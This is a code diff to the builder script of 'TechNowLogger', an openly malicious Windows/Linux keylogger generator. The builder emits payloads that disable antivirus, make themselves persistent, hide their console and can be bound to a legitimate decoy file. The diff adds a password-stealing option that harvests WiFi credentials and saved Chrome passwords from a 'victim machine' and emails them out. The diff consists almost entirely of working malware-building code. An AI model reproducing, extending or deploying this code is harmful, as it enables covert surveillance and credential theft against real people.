@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/python3
 import encrypt_code
 import argparse
 import subprocess
@@ -16,12 +16,13 @@ elif platform.system() == 'Linux':
     WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe")
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.5')
+    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.6')
     parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
+    parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{RED}Supported OS : Windows{YELLOW}]", action='store_true')
     parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.")
     
     
@@ -70,27 +71,44 @@ def check_dependencies():
 def create_keylogger(file_name, interval, email, password, time_persistent):
     with open(file_name, "w+") as file:
         file.write("import keylogger, win32event, winerror, win32api\n")
-
+        if arguments.stealer:
+            file.write("import threading, password_stealer\n\n")
         
         #Below Codes will check for already running instance,
-        file.write("mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')\n\n")
+        file.write("mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')\n\n")       
+
+        if arguments.stealer:
+            #Saved Password Stealer 
+            file.write("def steal():\n")
+            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\')\n")
+            file.write(f"\tsteal.get_wifi_creds()\n")
+            file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
+            file.write(f"\tsteal.get_chrome_browser_creds()\n")
+            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n\n")
+        
         file.write("def check_and_start():\n")
         file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
         file.write("\t\tmutex = None\n")
         file.write("\t\tprint(\"[+] Disabling Keylogger: Already Running\")\n")
         
-        file.write("\telse:\n")  # if no instance running, going to run Keylogger
+        file.write("\telse:\n")  # if no instance running, going to run Keylogger        
 
+        if arguments.stealer:
+            file.write(f"\t\tt1 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
+            file.write(f"\t\tt1.start()\n\n")                           #Starting Thread
         file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
         file.write("\t\ttechnowlogger.kill_av()\n")        
         file.write(f"\t\ttechnowlogger.become_persistent({time_persistent})\n")
-        file.write("\t\ttechnowlogger.start()\n")
-        file.write("check_and_start()\n")        
+        file.write("\t\ttechnowlogger.start()\n\n")       
+        
+        file.write("check_and_start()\n")      #Running/Calling the Functions   
 
 def create_keylogger_binded(file_name, interval, email, password, time_persistent, legitimate_file):
     with open(file_name, "w+") as file:
-        file.write("import keylogger, sys, subprocess, win32event, winerror, win32api, threading\n\n")        
-
+        file.write("import keylogger, sys, subprocess, win32event, winerror, win32api, threading\n")
+        if arguments.stealer:
+            file.write("import password_stealer\n\n")
+        
         #Codes to Run, Legitimate File on Front End
         file.write("def run_front_file():\n")        
         file.write(f"\tfile_name = sys._MEIPASS.replace('\\\\', '/') + \"/{legitimate_file}\" \n")       
@@ -102,12 +120,26 @@ def create_keylogger_binded(file_name, interval, email, password, time_persisten
                
         #Below Codes will check for already running instance,
         file.write("mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')\n\n")
+        
+        if arguments.stealer:
+            #Saved Password Stealer 
+            file.write("def steal():\n")
+            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\')\n")
+            file.write(f"\tsteal.get_wifi_creds()\n")
+            file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
+            file.write(f"\tsteal.get_chrome_browser_creds()\n")
+            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n\n")        
+        
         file.write("def check_and_start():\n")
         file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
         file.write("\t\tmutex = None\n")
         file.write("\t\tprint(\"[+] Disabling Keylogger: Already Running\")\n")
                 
         file.write("\telse:\n")  # if no instance running, going to run Keylogger
+
+        if arguments.stealer:
+            file.write(f"\t\tt2 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
+            file.write(f"\t\tt2.start()\n\n")                           #Starting Thread
 
         file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
         file.write("\t\ttechnowlogger.kill_av()\n")        
@@ -131,10 +163,16 @@ def obfuscating_payload(file_name):
         file.write(text)
 
 def compile_for_windows(file_name, icon_path):
-    subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
+    if arguments.stealer:
+        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path}", shell=True)
+    else:
+        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
 def compile_for_windows_binded(file_name, icon_path):
-    subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
+    if arguments.stealer:
+        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile  --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
+    else:
+        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)    
 
 def compile_for_linux(file_name, icon_path):
     subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
@@ -251,5 +289,6 @@ if __name__ == '__main__':
     
     except KeyboardInterrupt:        
         exit_greet()
+        del_junk_file(arguments.out)
         
         
